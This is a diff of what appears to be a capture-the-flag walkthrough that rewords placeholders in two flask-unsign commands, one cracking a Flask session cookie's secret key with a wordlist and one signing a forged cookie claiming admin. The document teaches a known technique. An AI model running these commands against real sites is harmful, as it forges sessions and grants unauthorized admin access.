@@ -54,7 +54,7 @@ The tool you installed will help with this step. You'll need the current cookie 
 Run this command:
 
 ```bash
-flask-unsign --unsign --cookie '(cookie value you got)' --wordlist wordlist.txt
+flask-unsign --unsign --cookie '(cookie value you got from website)' --wordlist wordlist.txt
 ```
 
 **Explanation:**
@@ -72,7 +72,7 @@ Now that you have the secret key, you can "sign" your own cookie, and the server
 Run this command:
 
 ```bash
-flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret '(the cookie it give you)'
+flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret '(the cookie it give you on step 4)'
 ```
 
 **Explanation:**
